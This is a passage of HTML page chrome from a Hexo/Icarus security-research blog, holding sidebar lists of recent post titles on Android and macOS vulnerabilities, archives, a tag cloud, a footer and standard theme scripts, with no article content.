fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-10T06:23:56.000Z">2022-10-10</time></p><p class="title"><a href="/2022/10/10/%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-30T07:29:09.000Z">2022-07-30</time></p><p class="title"><a href="/2022/07/30/Android%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">Android安全笔记</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-20T12:35:56.000Z">2022-07-20</time></p><p class="title"><a href="/2022/07/20/Android%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">Android中间人攻击方法整理</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-04T12:34:01.000Z">2022-07-04</time></p><p class="title"><a href="/2022/07/04/Android-11-%E9%AD%94%E5%BD%A2%E5%A5%B3%E6%BC%8F%E6%B4%9E/">Android 11 魔形女漏洞</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-01T13:59:36.000Z">2022-07-01</time></p><p class="title"><a href="/2022/07/01/macOS-Intel%E5%9B%BE%E5%BD%A2%E5%86%85%E6%A0%B8%E6%8B%93%E5%B1%95RCE-EOP/">macOS Intel图形内核拓展RCE+EOP</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/10/"><span class="level-start"><span class="level-item">October 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/07/"><span class="level-start"><span class="level-item">July 2022</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/06/"><span class="level-start"><span class="level-item">June 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">May 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/04/"><span class="level-start"><span class="level-item">April 2022</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">March 2022</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">February 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">January 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/12/"><span class="level-start"><span class="level-item">December 2021</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/11/"><span class="level-start"><span class="level-item">November 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">August 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ASN-1/"><span class="tag">ASN.1</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/AppleAVE2/"><span class="tag">AppleAVE2</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ContentProvider/"><span class="tag">ContentProvider</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/IOServices/"><span class="tag">IOServices</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/LPE/"><span class="tag">LPE</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PendingIntent/"><span class="tag">PendingIntent</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/adobe/"><span class="tag">adobe</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/afl/"><span class="tag">afl++</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ams/"><span class="tag">ams</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/android/"><span class="tag">android</span><span class="tag">18</span></a></div><div class="control"><a class="tags has-addons" href="/tags/aosp/"><span class="tag">aosp</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/apple/"><span class="tag">apple</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/arm64/"><span class="tag">arm64</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cfprefsd/"><span class="tag">cfprefsd</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/chrome/"><span class="tag">chrome</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/darwin/"><span class="tag">darwin</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/exploit/"><span class="tag">exploit</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/fuzz/"><span class="tag">fuzz</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/gpu/"><span class="tag">gpu</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/hook/"><span class="tag">hook</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/intel/"><span class="tag">intel</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/intent/"><span class="tag">intent</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/iomfb/"><span class="tag">iomfb</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ios/"><span class="tag">ios</span><span class="tag">14</span></a></div><div class="control"><a class="tags has-addons" href="/tags/linux/"><span class="tag">linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/logic-vul/"><span class="tag">logic vul</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/lpe/"><span class="tag">lpe</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/mach/"><span class="tag">mach</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/macos/"><span class="tag">macos</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/mig/"><span class="tag">mig</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/note/"><span class="tag">note</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/npu/"><span class="tag">npu</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pac/"><span class="tag">pac</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pipe/"><span class="tag">pipe</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pongoOS/"><span class="tag">pongoOS</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qemu/"><span class="tag">qemu</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qualcom/"><span class="tag">qualcom</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qualcomm/"><span class="tag">qualcomm</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rce/"><span class="tag">rce</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/safari/"><span class="tag">safari</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/samsung/"><span class="tag">samsung</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/soot/"><span class="tag">soot</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/static-analysis/"><span class="tag">static analysis</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/syzkaller/"><span class="tag">syzkaller</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tcc/"><span class="tag">tcc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/telecom/"><span class="tag">telecom</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/uaf/"><span class="tag">uaf</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/vul/"><span class="tag">vul</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/webaudio/"><span class="tag">webaudio</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xnu/"><span class="tag">xnu</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xpc/"><span class="tag">xpc</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="buffer0verflooow - Blog" height="28"></a><p class="is-size-7"><span>&copy; 2024 buffer0verflooow</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2019</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>